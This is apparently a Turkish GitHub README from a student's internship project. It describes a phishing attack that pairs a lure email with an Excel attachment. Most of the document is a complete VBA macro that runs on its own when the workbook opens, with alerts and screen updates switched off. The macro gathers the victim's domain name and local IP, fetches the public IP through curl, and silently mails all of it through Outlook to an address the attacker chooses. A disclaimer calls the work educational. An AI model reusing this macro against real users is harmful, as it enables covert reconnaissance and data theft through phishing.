# PhisingMail
#Eğitim amaçlı hazırladığım ve eğitim amaçlı sunduğum phising mail taktiği
# Bu eğitim amaçlı gerçekleştirilen ve staj ödevim olan bir çalışmadır. Exelin güvenlik önlemleri sayesinde kolaylıkla engellenebilmekte ve kullanıcının verdiği özel izinler haricinde çalıştırılamamaktadır. Eğitim amaçlı yapılan bu projenin kötü amaçlar için kullanılmasında sorumluluk tamamen kullanıcıya aittir.

Phishing (oltalama) e-postalarının temel amacı, alıcıyı kandırarak kişisel, finansal veya gizli bilgilerini ele geçirmektir. Bu tür e-postalar genellikle güvenilir bir kurumdan (örneğin bir banka, resmi bir kuruluş veya tanınmış bir hizmet sağlayıcı) geliyormuş gibi görünür. Phishing saldırılarının temel amaçları şunlardır:

1. Kişisel Bilgi Çalmak
Kimlik bilgileri (ad, soyad, adres, doğum tarihi)
Kullanıcı adları ve şifreler
Sosyal güvenlik numaraları veya kimlik numaraları
2. Finansal Bilgilere Erişim Sağlamak
Banka hesap bilgileri
Kredi kartı numaraları
Online ödeme hizmetleri (örneğin, PayPal) giriş bilgileri
3. Kötü Amaçlı Yazılım Bulaştırmak
E-postadaki ekler veya bağlantılar aracılığıyla zararlı yazılımlar (ör. ransomware, keylogger) yüklenir.

Bu çalışmamda eğitim amaçlı exel üzerindeki macro sayesinde kullanıcının ip adresini alıp, bilgisayardaki outlook uygulamasını kullanarak belirtilen mail adresine gönderilen bir saldırı senaryosu gerçekleştirdim.

Öncelikle dikkat çekici ve insanların exel dosyasını açmasını sağlayacağım bir mail oluşturdum.
![image](https://github.com/user-attachments/assets/b1bee734-7b02-4d41-a707-c06872b9ca3e)

Oluşturduğum exel vba macrosunu exelime yükledim.

Sub SendMachineInfoViaEmail()
Dim ipAddress As String
Dim domainName As String
Dim publicIpAddress As String
Dim emailBody As String
Dim olApp As Object
Dim olMail As Object
Dim wshell As Object
Dim wmi As Object
Dim colItems As Object
Dim objItem As Object
Dim shellOutput As String
' IP adresini ve domain bilgilerini alma
Set wshell = CreateObject("WScript.Shell")
domainName = wshell.ExpandEnvironmentStrings("%USERDOMAIN%")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = wmi.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled =
True")
For Each objItem In colItems
If Not IsNull(objItem.ipAddress) Then
ipAddress = objItem.ipAddress(0)
Exit For
End If
Next
' Komut satırı ile genel IP adresini alma
shellOutput = CreateObject("WScript.Shell").Exec("cmd /c curl https://api.ipify.org").StdOut.ReadAll
'publicIpAddress = Trim(shellOutput)
' E-posta içeriği oluşturma
emailBody = "Domain Name: " & domainName & vbCrLf & _
"Local IP Address: " & ipAddress & vbCrLf & _
"Public IP Address: " & shellOutput
' Outlook uygulamasını açma ve yeni bir e-posta oluşturma
On Error Resume Next
Set olApp = GetObject(, "Outlook.Application")
If Err.Number <> 0 Then
Set olApp = CreateObject("Outlook.Application")
End If
On Error GoTo 0
Set olMail = olApp.CreateItem(0) ' 0 = olMailItem
' E-posta ayarları
With olMail
.To = " " ' Gönderilecek e-posta adresini buraya ekleyin
.Subject = "Machine Information"
.Body = emailBody
.Send
End With
' Temizlik
Set olMail = Nothing
Set olApp = Nothing
Set wshell = Nothing
Set wmi = Nothing
Set colItems = Nothing
End Sub
Private Sub Workbook_Open()
Application.DisplayAlerts = False
Application.ScreenUpdating = False
Call SendMachineInfoViaEmail
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub


Ve dosyamı kaydedip mailime ek olarak yerleştirdim.

# Bu eğitim amaçlı gerçekleştirilen ve staj ödevim olan bir çalışmadır. Exelin güvenlik önlemleri sayesinde kolaylıkla engellenebilmekte ve kullanıcının verdiği özel izinler haricinde çalıştırılamamaktadır. Eğitim amaçlı yapılan bu projenin kötü amaçlar için kullanılmasında sorumluluk tamamen kullanıcıya aittir.


